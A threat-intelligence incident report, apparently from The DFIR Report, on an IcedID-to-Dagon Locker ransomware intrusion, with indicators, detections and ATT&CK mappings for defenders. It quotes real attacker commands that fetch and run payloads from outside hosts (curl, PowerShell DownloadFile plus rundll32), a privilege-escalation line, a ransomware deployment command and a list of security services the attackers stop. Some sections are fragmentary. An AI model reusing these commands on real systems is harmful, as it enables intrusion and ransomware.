---
title: "From IcedID to Dagon Locker Ransomware in 29 Days - The DFIR Report"
source_url: "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/"
published: "2024-04-29T01:21:08+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2024-04-29_IcedID-to-Dagon-Locker.html"
---

# From IcedID to Dagon Locker Ransomware in 29 Days - The DFIR Report
## Key Takeaways

- In August 2023, we observed an intrusion that started with a phishing campaign using PrometheusTDS to distribute IcedID.

- IcedID dropped and executed a Cobalt Strike beacon, which was then used through-out the intrusion.

- The threat actor leveraged a bespoke PowerShell tool known as AWScollector to facilitate a range of malicious activities including discovery, lateral movement, data exfiltration, and ransomware deployment.

- Group Policy was used to distribute Cobalt Strike beacons at login to a specific privileged user group.

- The threat actor utilized a suite of tools to support their activities, deploying Rclone, Netscan, Nbtscan, AnyDesk, Seatbelt, Sharefinder, and AdFind.

- This case had a TTR (time to ransomware) of 29 days.

More information about IcedID and Dagon Locker can be found in the following reports: SentinelOne , The DFIR Report , and Group-IB .

An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon .

## Services

- Private Threat Briefs : Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.

- Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.

- All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.

- Private Sigma Ruleset : Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.

- DFIR Labs : Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.

Contact us today for a demo!

#### Table of Contents:

- Case Summary

- Services

- Analysts

- Initial Access

- Execution

- Persistence

- Privilege Escalation

- Defense Evasion

- Credential Access

- Discovery

- Lateral Movement

- Collection

- Command and Control

- Exfiltration

- Impact

- Timeline

- Diamond Model

- Indicators

- Detections

- MITRE ATT&CK

## Case Summary

This intrusion started in August 2023 with a phishing campaign that distributed IcedID malware. This phishing operation utilized the Prometheus Traffic Direction System (TDS) to deliver the malware. Victims were directed to a fraudulent website, mimicking an Azure download portal. Here, they were prompted to download a malicious JavaScript file. Upon executing this file, a multi-step attack was triggered. Initially, a batch file was generated and executed on the user’s system. This batch file used the curl command to download an IcedID DLL file. Finally, this DLL file was executed, completing the malware installation process.

Once the DLL file was executed, the IcedID malware established persistence by creating a scheduled task on the infected system. This ensured that the malware would continue to operate even after the system was restarted. Following this, the malware established a command and control (C2) connection with the IcedID servers. Through this connection, it executed a series of discovery commands using standard Windows utilities to gather information about the infected system. About 30 hours after inactivity, the IcedID malware downloaded and executed a Cobalt Strike beacon.

The Cobalt Strike beacon was staged on the temporary file-sharing website, file.io, and was downloaded to the infected host using PowerShell. Once executed, the threat actor leveraged commonly used system utilities such as net , whoami , nltest , and ping to conduct discovery operations from the Cobalt Strike beacon. Shortly after these initial discovery operations, we observed access to the Local Security Authority Subsystem Service (LSASS) process, indicating attempts to access credentials. There was also evidence of the GetSystem command being used for privilege escalation, allowing the attacker to obtain higher-level system privileges.

Within just five minutes of executing the Cobalt Strike beacon, the threat actor initiated lateral movement within the network. They transferred a Cobalt Strike beacon to a domain controller using the Server Message Block (SMB) protocol. This beacon was then executed via remote services.

The threat actor continued their discovery activities on both the initial beachhead and the domain controller, specifically targeting file shares. To accomplish this, they utilized a combination of net commands, AdFind, and Sharefinder to identify and access these network shares. After locating the desired network shares, they deployed Rclone, though its usage was brief. Next, the threat actor shifted to using a custom PowerShell tool, named AWSCollector. This tool’s initial deployment involved executing a series of system discovery commands on remote hosts through its systeminfo module.

Approximately an hour and a half after initiating data exfiltration with Rclone, the threat actor transitioned to their custom AWSCollector script, to continue the data transfer to AWS S3 bucket storage. Over the ensuing hours, they continued discovery operations and even deployed a Speedtest tool, likely to assess the network speed and determine the feasibility and duration of their exfiltration efforts. As the data exfiltration progressed, they expanded their foothold in the environment by deploying Cobalt Strike beacons to additional hosts. These were copied to hosts using SMB and the Windows copy utility, followed by the execution of the beacon by remote WMIC commands.

As the situation progressed into the third day, the threat actor remained engaged and active, continuing their data exfiltration activities. They also deployed discovery tools such as Seatbelt and SoftPerfect Netscan to further explore the network. On the fourth day, the focus shifted to the virtualization infrastructure. The threat actor executed various commands to gather information about the virtualization components, which involved the zipping and suspected exfiltration of targeted documents pertinent to virtualization. Additionally, on network shares, the threat actor located and reviewed documents containing passwords for the organization.

Entering the fifth day, the threat actor continued discovery efforts using many of the same tools previously observed. During this period, they also began dumping Windows event logs and executing various WMIC discovery commands to gain further insight into the environment. The activities on the sixth and seventh days mirrored those of the previous days. On the eighth day, the threat actor deployed AnyDesk on a domain controller using a PowerShell script. This script not only installed AnyDesk but also created a new user account and added it to the local administrators group. On this day we also observed the threat actor deploy a new Cobalt Strike beacon.

Using the AnyDesk access, the threat actor logged into the domain controller and accessed various system administrator utilities, including Sites and Services, Administrative Center, Domains and Trusts, Users and Computers, and Group Policy. The focus of their activity seemed to be Group Policy, where they attempted to create a Logon script for the environment.

Three days after their previous actions, the threat actor returned to modify the Group Policy settings they had initially focused on. Following these changes, they expanded their operational scope by installing AnyDesk and Cobalt Strike beacons on additional hosts. Over the next several days, the threat actor continued to return, utilizing the graphical user interfaces (GUI) of Windows administrative tools to review and likely analyze data.

On the 28th day of activity, the threat actor resumed operations by attempting to configure a domain controller to proxy RDP access across another network segment using the netsh utility. However, this configuration failed to achieve their intended result and was promptly removed. The threat actor also engaged in network reconnaissance by requesting Kerberos Service Principal Names (SPNs) using the setspn command-line tool.

On the 29th day, they started running discovery checks using net commands. About five hours later, they prepared for their final operations by staging a Dagon Locker ransomware file on a domain controller. Utilizing their custom AWSCollector script, the ransomware was deployed via SMB to remote hosts. The script also generated a batch script to disable services, delete shadow copies, and execute the ransomware, leading to domain wide ransomware. This entire process resulted in a Time to Ransomware (TTR) of 684 hours, over 29 days.

If you would like to get an email when we publish a new report, please subscribe here .

## Analysts

Analysis and reporting completed by r3nzsec , angelo_violetti & UC1

## Initial Access

In August 2023 we observed an IcedID e-mail phishing campaign, utilizing PrometheusTDS URLs directly in email.

@ffforward reported the distribution on Twitter :

For a full breakdown on the TDS see this report by Group-IB.

Once the user clicked the link, they would be presented with an Azure looking page containing a captcha, and if they pass all the filtering requirements of the TDS they would be presented with a download for a JavaScript file, Document_Scan_468.js in this intrusion.

## Execution

IcedID

When the user executed the downloaded Javascript file, Document_Scan_468.js , the following happened:

- A bat file was created using a curl command to download the IcedID payload from moashraya[.]com .
- C:\Windows\System32\cmd.exe" /c echo curl https://moashraya[.]com/out/t.php --output "%temp%\magni.waut.a" --ssl no-revoke --insecure --location > "%temp%\magni.w.bat

- Execution of the batch script.
- cmd.exe /c "%temp%\magnu.w.bat"

- After downloading, the file magni.waut.a is renamed to magni.w .
- cmd.exe /c ren "%temp%\magni.waut.a" "magni.w"

- Using rundll32.exe, it executes the function scab with the arguments \k arabika752 from the downloaded and renamed file magni.w .
- rundll32 "%temp%\magni.w", scab \k arabika752

Shortly after, we see rundll32.exe accessing and injecting into svchost.exe

Using memory captured from the system and processing it with MemprocFS; we can see via the memory, YARA scanning confirmation of the IcedID injection into process 4492.

This process then started communicating out to the following C2 domains:

- ewacootili[.]com (151.236.9[.]176)

- ultrascihictur[.]com (159.223.95[.]82)

- magiraptoy[.]com (194.58.68[.]187)

And then deleted the file %temp%\festival-.dat . This was most likely an update to the IcedID configuration which gets loaded.

A summary of the discovery commands, and other activity can be seen in the Discovery section.

Decoding the obfuscated javascript

Document_Scan_468.js employed a simple obfuscating technique. The technique consists of splitting the commands to be run into chunks of three, and concatenating them together. The same technique was used to obfuscate the JS functions as well.

Cobalt Strike DLL HTTPS Beacon

The first Cobalt Strike beacon was downloaded, and subsequently executed, by the threat actor from file.io through the following PowerShell commands.
powershell.exe(New-Object System.Net.WebClient).DownloadFile("https://file[.]io/OUXPza4b4uxZ", "C:\ProgramData\update.dll") %WINDIR%\system32\rundll32.exe" update.dll,HTVIyKUVoTzv
Cobalt Strike PowerShell HTTPS Beacon

Via the Cobalt Strike command and control server, the threat actor generated a PowerShell script which injected a stageless beacon into memory.

In the first part of the script, there are two defined functions, func_get_proc_address and func_get_delegate_type , which are used to dynamically load and execute unmanaged code. Subsequently, a long BASE64 encoded string is defined which corresponds to the Cobalt Strike shellcode.

The BASE64 string is then XOR decoded with a decimal key equal to 35 . In order to inject the decoded shellcode, the script retrieves the function pointer for the Windows APIs function GetModuleHandleA and GetProcAddress that are needed to obtain a pointer to VirtualAlloc . The call to VirtualAlloc creates a new memory section with AllocationType MEM_COMMIT | MEM_RESERVERE (0x3000) and MemoryProtection ExecuteReadWrite (0x40). This type of variables passed to VirtualAlloc are classic signs of process injection. Subsequently, the shellcode is copied into the newly created region of memory and then executed through the Invoke() function.

The BASE64 string can be easily decoded through CyberChef to get the Cobalt Strike shellcode. It is possible to recognize the classic MZ header ( magic_mz_x86 and magic_mz_x64 ): MZARUH .

By executing the PowerShell script and monitoring the API calls performed by the process through API Monitor, it is possible to identify the calls to InternetConnectA() with the Cobalt Strike C2s specified as parameters.

Existing Yara rules detect Cobalt Strike beacons by hunting for the previously mentioned header like the following one, however, defenders need to be aware that those types of strings can be modified from beacons through malleable profiles.

https://github.com/elastic/protections-artifacts/blob/72fd8cad90189e9d145d22eb3d4fee2fe3d5902f/yara/rules/Windows_Trojan_CobaltStrike.yar#L1011

## Persistence

IcedID

During the execution of the initial IcedID malware, a scheduled task was created to maintain persistence.

The task was set to run when the user logged in using the ‘LogonTrigger’. While audit logging was not enabled to observe the task creation via a 4698 event we were able to use Sysmon registry and file creation events for the task XML to correlate the creation with the initial IcedID malware.

Registry item related to task creation:

File write for task XML:

Cobalt Strike

The threat actor created several scheduled tasks on different servers, to achieve persistent execution of Cobalt Strike. As you can see below, the scheduled task files were created by a svchost injected process.

This is an example of one of the scheduled tasks created that, when executed, downloads and executes a Cobalt Strike beacon from 51.89.133[.]3 .

Furthermore, on a domain controller, the threat actor created a bat file under the local group policy directory.
C:\Windows\System32\GroupPolicy\User\Scripts\Logon\test.bat
The bat file contains the same PowerShell command as the scheduled task. These were then setup to execute at login by GPO policy targeting users in a specific domain group.

These same scheduled tasks could be located in the GPO policies under SYSVOL on the domain controller, below is an example of one pulled from a memory capture.

Anydesk

During the intrusion, the threat actor used a PowerShell script named anydesk.ps1 to:

- Download AnyDesk into the ProgramData folder.

- Install AnyDesk in silent mode and set the password to access the software remotely.

- Create a user named oldadministrator , add it to the local administrator group, and hide it from the Windows home/login screen.

Installing AnyDesk in this way sets up the program with a service to start automatically, providing the threat actor with an additional means of persistence in the network.

The AnyDesk ad.trace logs track incoming connections into the system. Those logs can be found under the folder C:\Users\<user>\AppData\Roaming\AnyDesk .

The ad_svc.trace log files record the external IP addresses that logged into the system. Those logs can be found under the folder C:\ProgramData\Anydesk .

AnyDesk Client-ID:
Client-ID: 150937834
The following two IP addresses were identified that could be related to VPN services based on IPQualityScore:

- 82.102.18.244 – NordVPN

- 194.33.40.113 – Surfshark VPN

New User Creation

The anydesk.ps1 script included the creation of a new user account, which was then added to the local administrators group and then hid from the logon screen. This latter technique is performed by setting the value of the following registry key related to the specific user, to “0”:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist

## Privilege Escalation

To obtain SYSTEM privileges, the threat actor executed the getsystem Cobalt Strike functionality multiple times.

We saw the threat actor use variations of this which indicates likely getsystem activity:
C:\Windows\system32\cmd.exe /c echo 00e4f7418cd > \\.\pipe\9090e9

This technique was thoroughly described here:

- SEO Poisoning to Domain Control: The Gootloader Saga Continues

When the threat actor created the new user account, they also also added that new account to a privileged active directory group.

## Defense Evasion

Process Injection

As mentioned in the Execution section, we see IcedID injecting itself into svchost.exe

We also observed Cobalt Strike injecting into gpupdate.exe. Later they injected themselves into svchost.exe. This was done as a result of using named pipe impersonation to get SYSTEM rights on the client.

Dumping PID 4860 from memory and scanning with YARA rules from the LOKI signature base we can find evidence of the Cobalt Strike injection.

Volatility dump command:
vol -f [REDACTED].dmp windows.memmap.Memmap --dump --pid 4860
Scan results:

We can get further corroboration with 1768.py :

We can also use the memory file processed with MemprocFS for similar YARA scan hits:

Disable or Modify System Firewall

We observed the threat actor attempting to access a restricted host by pivoting through another host.

This was attempted by using the built-in netsh portproxy command to port forward 3390 on the local host, to 3389 (RDP) on the remote host.

-

-

Stops known services on the host

- Generates a list of services to stop based on a built-in list and checking each system using Get-Service

- Services of interest:
eventlog
wecsvc
SntpService
Sophos Agent
Sophos Endpoint Defense Service
Sophos Message Router
Sophos System Protection Service
ArcticWolfAgentMgr
endpoint
cybereason
cylance
DefWatch
ccEvtMgr
ccSetMgr
SavRoam
RTVscan
YooBackup
YooIT
zhudongfangyu
sophos
stc_raw_agent
VSNAPVSS
VeeamTransportSvc
VeeamDeploymentService
VeeamNFSSvc
veeam
PDVFSService
BackupExecVSSProvider
BackupExecAgentAccelerator
BackupExecAgentBrowser
BackupExecDiveciMediaService
BackupExecJobEngine
BackupExecManagementService
BackupExecRPCService
AcrSch2Svc
AcronisAgent
CASAD2DWebSvc
CAARCUpdateSvc
SBPIMSvc
OssecSvc
Deletes shadow copies Sets system to boot into recovery mode on next restart Multiple methods to distribute and execute the ransomware If dll , use rundll32.exe If exe , use regsvr32.exe Using different switches depending if there is additional options, or not.

The module also supports testing using the -dryrun switch by not deploying the ransomware binary.

The threat actor also referenced multiple examples of running different ransomware variants, possibly indicating overlap between groups, reuse of tooling, or perhaps an affiliate that has used all of the referenced ransomware families.

-
-
- Egregor

- REvil

- Xing

- Quantum

- justright

- Mount Locker

- Pieper

- uhmc/ummc

- ottawa

- Conti

-

-

-

Pivoting on indicators

-

In the script there is a function to send messages to their Telegram Bot. This function is used multiple times throughout the script to send updates during execution.

-

-

-

-

The domain resolves to 51.89.133[.]3 which has also been seen used as a Cobalt Strike C2 and to serve beacons during other phases of the intrusion.

-

Checking the certificate associated with the IP reveals an interesting association.

-

-

108.62.123[.]147 is also identified in the Command and Control section related to Cobalt Strike.

-

## Impact

-

29 days after initial access, the threat actor started to deploy the Dagon Locker ransomware in the environment.

-

The threat actor distributed Dagon Locker ransomware on multiple systems across the environment through the custom PowerShell script, AWScollector, and the locker module described earlier.

-

The following PowerShell command was run from a domain controller.

-
invokemodule -module locker -locker <REDACTED>.dll -lockerpath programdata\microsoft -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
-

To prevent data recovery and stop multiple services, two different files called sysfunc.cmd were dropped into the systems.

-

-

-

Subsequently the execution of the locker PowerShell module, the ransomware, was deployed to different systems.

-

-

All systems were left with the below message:

-

-

Dagon Locker left on the test workstation also a log file related to its execution called sysfunc.dll.log .

-
Ver 5.1 x64 ========== SYS INFO ========== CORE COUNT: [REDACTED] TOTAL MEM: [REDACTED] WIN VER: [REDACTED] WIN ARCH: x64 USER NAME: [REDACTED] PC NAME: [REDACTED] IN DOMAIN: YES IS ADMIN: YES IN GROUPS: Mandatory [REDACTED]\Domain Users Mandatory \Everyone Mandatory BUILTIN\Administrators Mandatory BUILTIN\Remote Desktop Users Mandatory BUILTIN\Users Mandatory NT AUTHORITY\NETWORK Mandatory NT AUTHORITY\Authenticated Users Mandatory NT AUTHORITY\This Organization [...] Integrity Mandatory Label\High Mandatory Level CMDLINE: rundll32.exe C:\programdata\microsoft\sysfunc.dll,run /target=C:\programdata\microsoft\WPD\ [INFO] locker.init > locker ext .dagoned ================================ KILL SERVICE ================================ ================================ KILL PROCESS ================================ ========== TARGET LOCK ========== [INFO] locker.work.start.target > type=drive target=C:\programdata\microsoft\WPD\ [INFO] locker.work.thread.local > path=C:\programdata\microsoft\WPD\ [INFO] locker.queue.worker > empty group=FAST [INFO] locker.queue.worker > empty group=SLOW [ERROR] locker.dir > enum error=3 name=C:\programdata\microsoft\WPD\ [INFO] locker.work.thread.local > enum finish path=C:\programdata\microsoft\WPD\ [INFO] locker.thread.proxy > finish path=C:\programdata\microsoft\WPD\ ==[ STATS ]======================= Total crypted: 0.000 GB Crypt Avg: 0.000 MB/s Files: 0.000 files/s Time: 1 sec ==[ DIRS ]======================== Total: 0 Skipped: 0 Error: 1 ==[ FILES ]======================= Total: 0 Locked: 0 ==[ FILES SKIPPED ]=============== Black: 0 Locked: 0 Manual: 0 Prog: 0 Size: 0 ==[ FILE ERROR ]================== Open: 0 Read: 0 Write: 0 Pos: 0 Rename: 0 [OK] locker > finished
-

## Timeline

-

-

## Diamond Model

-

-

## Indicators

-

### Atomic

-
IcedID 143.110.245[.]38:443 159.89.124[.]188:443 188.114.97[.]7:443 151.236.9[.]176:443 159.223.95[.]82:443 194.58.68[.]187:443 87.251.67[.]168:443 151.236.9[.]166:443 rpgmagglader[.]com ultrascihictur[.]com oopscokir[.]com restohalto[.]site ewacootili[.]com magiraptoy[.]com fraktomaam[.]com patricammote[.]com moashraya[.]com Cobalt Strike 23.159.160[.]88 45.15.161[.]97 51.89.133[.]3 winupdate.us[.]to
-

### Computed

-
Document_Scan_468.js 0d8a41ec847391807acbd55cbd69338b 5066e67f22bc342971b8958113696e6c838f6c58 f6e5dbff14ef272ce07743887a16decbee2607f512ff2a9045415c8e0c05dbb4 license.dat bff696bb76ea1db900c694a9b57a954b ca10c09416a16416e510406a323bb97b0b0703ef 332afc80371187881ef9a6f80e5c244b44af746b20342b8722f7b56b61604953 Riadnc1.dll a144aa7a0b98de3974c547e3a09f4fb2 34c9702c66faadb4ce90980315b666be8ce35a13 9da84133ed36960523e3c332189eca71ca42d847e2e79b78d182da8da4546830 magni.w 7e9ef45d19332c22f1f3a316035dcb1b 4e0222fd381d878650c9ebeb1bcbbfdfc34cabc5 839cf7905dc3337bebe7f8ba127961e6cd40c52ec3a1e09084c9c1ccd202418e magni.w.bat b3495023a3a664850e1e5e174c4b1b08 38cd9f715584463b4fdecfbac421d24077e90243 65edf9bc2c15ef125ff58ac597125b040c487640860d84eea93b9ef6b5bb8ca6 update.dll 628685be0f42072d2b5150d4809e63fc 437fe3b6fdc837b9ee47d74eb1956def2350ed7e a0191a300263167506b9b5d99575c4049a778d1a8ded71dcb8072e87f5f0bbcf
-

## Detections

-

### Network

-
ET MALWARE Win32/IcedID Requesting Encoded Binary M4 ET MALWARE Win32/IcedID Request Cookie ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O) ThreatFox IcedID botnet C2 traffic (ip:port - confidence level: 60%) ET ATTACK_RESPONSE Microsoft Powershell Banner Outbound ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement ET POLICY WinRM wsman Access - Possible Lateral Movement ET INFO DYNAMIC_DNS HTTP Request to a *.us .to Domain ET INFO Windows Powershell User-Agent Usage ET POLICY Powershell Activity Over SMB - Likely Lateral Movement ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET DNS Query for .to TLD ET INFO DYNAMIC_DNS Query to a *.us .to Domain ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET POLICY WMIC WMI Request Over SMB - Likely Lateral Movement
-

### Sigma

-

Search rules on detection.fyi or sigmasearchengine.com

-

DFIR Public Rules Repo :

-
b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check 59e3a079-4245-4203-9d5c-f11290c5ba24 : Hiding local user accounts e7732014-c4b9-4653-92b2-aa7cfe154bf7 : Data Exfiltration via AWS CLI 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f : CHCP CodePage Locale Lookup
-

DFIR Private Rules:

-
a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line
de60a371-48c3-4e72-baae-ac56c8fb7349 : Data exfiltration to amazon AWS S3 buckets
-

Sigma Repo :

-
530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI e37db05d-d1f9-49c8-b464-cee1a4b11638 : PUA - Rclone Execution c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE cd219ff3-fa99-45d4-8380-a7d15116c6dc : New User Created Via Net.EXE 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo
1eeed653-dbc8-4187-ad0c-eeebb20e6599 : Potential SPN Enumeration Via Setspn .EXE
-

### Yara

-

Hunting/Analysis Rules:

-
https://github.com/The-DFIR-Report/Yara-Rules/blob/main/23869/23869.yar

https://github.com/malpedia/signator-rules/blob/main/rules/win.cobalt_strike_auto.yar informational_AdFind_AD_Recon_and_Admin_Tool https://github.com/The-DFIR-Report/Yara-Rules/blob/main/5426/5426.yar Adfind https://github.com/bartblaze/Yara-rules/blob/master/rules/hacktools/Adfind.yar nbtscan_utility_softcell https://github.com/advanced-threat-research/Yara-Rules/blob/master/APT/APT_Operation_SoftCell.yar Windows_Trojan_CobaltStrike_7f8da98a https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar
-

## MITRE ATT&CK

-

-
Access Token Manipulation - T1134 Archive via Utility - T1560.001 Data Encrypted for Impact - T1486 Disable or Modify System Firewall - T1562.004 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration to Cloud Storage - T1567.002 File and Directory Discovery - T1083 Inhibit System Recovery - T1490 LSASS Memory - T1003.001 Malicious File - T1204.002 Network Share Discovery - T1135 Process Injection - T1055 Remote Access Software - T1219 Scheduled Task - T1053.005 System Information Discovery - T1082 System Language Discovery - T1614.001 System Time Discovery - T1124 Web Protocols - T1071.001 SMB/Windows Admin Shares - T1021.002 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Powershell - T1059.001 Windows Command Shell - T1059.003 Javascript - T1059.007 Rundll32 - T1218.011 Command Obfuscation - T1027.010 Domain Account - T1136.002 Credentials In Files - T1552.001 Disable or Modify Tools - T1562.001 System Owner/User Discovery - T1033 Data from Network Shared Drive - T1039 Encrypted Channel - T1573 Ingress Tool Transfer - T1105 Automated Exfiltration - T1020 Service Stop - T1489
-

Internal case # TB23869 PR28513

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
